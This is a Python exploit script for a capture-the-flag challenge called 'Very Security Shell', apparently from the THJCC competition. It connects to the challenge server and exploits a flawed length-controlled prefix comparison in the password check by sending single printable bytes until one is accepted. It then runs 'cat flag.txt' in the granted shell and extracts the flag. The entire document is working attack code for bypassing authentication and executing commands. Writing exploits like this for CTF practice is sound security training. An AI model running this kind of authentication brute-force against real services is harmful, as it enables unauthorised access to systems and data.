#!/usr/bin/env python3
"""Exploit Very Security Shell's length-controlled prefix comparison."""

from __future__ import annotations

import argparse
import re
import socket
import sys


PROMPT = b"please input your password:\n"
SUCCESS = b"You input the right password, welcome!\n"
ALPHABET = bytes(range(0x21, 0x7F))


def receive_until_any(
    connection: socket.socket, markers: tuple[bytes, ...]
) -> tuple[bytes, bytes]:
    data = bytearray()
    while True:
        for marker in markers:
            if marker in data:
                return bytes(data), marker
        chunk = connection.recv(4096)
        if not chunk:
            raise ConnectionError("service closed the connection unexpectedly")
        data.extend(chunk)


def exploit(host: str, port: int) -> tuple[int, str]:
    with socket.create_connection((host, port), timeout=10) as connection:
        connection.settimeout(10)
        receive_until_any(connection, (PROMPT,))

        winning_byte: int | None = None
        for candidate in ALPHABET:
            connection.sendall(bytes((candidate,)) + b"\n")
            _, marker = receive_until_any(connection, (PROMPT, SUCCESS))
            if marker == SUCCESS:
                winning_byte = candidate
                break

        if winning_byte is None:
            raise RuntimeError("no printable first-byte candidate was accepted")

        connection.sendall(b"cat flag.txt; exit\n")
        connection.shutdown(socket.SHUT_WR)

        response = bytearray()
        while True:
            chunk = connection.recv(4096)
            if not chunk:
                break
            response.extend(chunk)

    return winning_byte, response.decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="chal.thjcc.org")
    parser.add_argument("port", nargs="?", type=int, default=11039)
    args = parser.parse_args()

    candidate, output = exploit(args.host, args.port)
    match = re.search(r"THJCC\{[^\r\n}]+\}", output)
    if match is None:
        raise RuntimeError(f"flag not found in service output: {output!r}")

    print(f"accepted prefix byte: {chr(candidate)!r} (0x{candidate:02x})")
    print(f"flag: {match.group(0)}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (ConnectionError, OSError, RuntimeError) as error:
        print(f"error: {error}", file=sys.stderr)
        raise SystemExit(1)
